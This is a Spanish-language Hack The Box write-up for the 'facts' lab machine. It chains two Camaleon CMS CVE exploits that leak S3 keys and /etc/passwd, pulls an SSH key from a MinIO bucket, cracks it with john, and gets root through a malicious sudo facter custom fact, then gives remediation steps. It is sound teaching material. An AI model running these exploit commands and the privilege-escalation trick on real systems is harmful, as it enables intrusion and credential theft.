## Reconocimiento

El primer escaneo identifica los puertos expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.42.103
```

Puertos relevantes:
- `22/tcp` - SSH (OpenSSH 9.9p1)
- `80/tcp` - nginx 1.26.3 (Camaleon CMS)
- `54321/tcp` - MinIO (servicio de almacenamiento S3)

El segundo escaneo profundiza en servicios y versiones:

```bash
nmap -p22,80,54321 -sCV 10.129.42.103
```

Información clave:
- Redirección a `facts.htb` → trabajo con virtual hosts
- MinIO en puerto 54321 con credenciales S3

## Explotación

### CVE-2025-2304: Privilege Escalation en Camaleon CMS

Esta CVE permite escalar privilegios de usuario autenticado:

```bash
python exploit.py -u http://facts.htb -U test -P test -e
```

![Explotación con CVE-2025-2304](/images/writeups/facts/camaleon-exploit.png)

Salida relevante:
```
[+]Login confirmed
   User ID: 5
   Current User Role: admin
[+]Loading PRIVILEGE ESCALATION
   User ID: 5
   Updated User Role: admin
[+]Extracting S3 Credentials
   s3 access key: AKIA4B37813EE67BBEB5
   s3 secret key: DU+hrpDq5PZc0/+FTRhROnhqwc/i3c0G0BvYE1cZ
   s3 endpoint: http://localhost:54321
```

La CVE-2025-2304 no solo otorga accesoadmin, también extrae credenciales S3 de MinIO.

### CVE-2024-46987: File Read en Camaleon CMS

Con un usuario válido, podemos leakear archivos del sistema:

```bash
python3 exploit-fileread.py -u http://facts.htb -l test -p test /etc/passwd | grep bash
```

Resultado:
```
root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
```

Usuario interesante: `trivia`

Buckets disponibles:

Explorando el bucket `internal`:

```bash
aws --endpoint-url http://10.129.42.103:54321 s3 ls s3://internal/
```

Directorio `.ssh` contiene claves privadas:

```bash

2026-04-23 05:32:10         82 authorized_keys
```

Descargando la clave SSH:

```bash
aws --endpoint-url http://10.129.42.103:54321 s3 cp s3://internal/.ssh/id_ed25519 .
```

## Crackeo de clave SSH

La clave está protegida con contraseña. Usamos ssh2john + john:

```bash
ssh2john id_ed25519 > hash
john hash /usr/share/wordlists/rockyou.txt.gz
```

Contraseña/crackeada: `dragonballz`

## Escalada de privilegios

Verificando permisos sudo:

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`facter` es una herramienta Puppet. Permite ejecución arbitraria de código a través de custom facts:

```bash
cat > /tmp/root.rb <<'EOF'
Facter.add(:pwned) do
  setcode do
    exec('/bin/bash')
  end
end
EOF
```

Ejecutando el facter malicioso:

```bash
sudo facter --custom-dir=/tmp pwned
```

Obtenemos shell como root:

```
root@facts:/home/trivia#
```

### Root Flag

```bash
cat /root/root.txt
```

## Cadena de explotación

```text
Camaleon CMS 2.9.0
-> CVE-2025-2304 (priv escalation)
-> Extracción de credenciales S3
-> MinIO (bucket internal)
-> Descarga de clave SSH .ssh/id_ed25519
-> ssh2john + john (crack password)
-> SSH como trivia
-> sudo facter (privilege escalation)
-> Root shell
```

## Lecciones técnicas

- Las vulnerabilidades de CMS pueden revelar credenciales de servicios relacionados (MinIO en este caso).
- MinIO expone almacenamiento S3 que puede contener claves SSH u otros secretos sensibles.
- La combinación de múltiples vectores (CVE → S3 → SSH → sudo) es común en máquinas de HTB.
- Herramientas Puppet como facter pueden ser vectores de escalada si se permiten sudoers.

## Remediación

1. Actualizar Camaleon CMS a versión sin vulnerabilidades conocidas.
2. No reutilizar credenciales S3 entre servicios.
3. Restringir comandos en sudoers; remover facter si no es necesario.
4. Limitar acceso a MinIO y bucket internos.
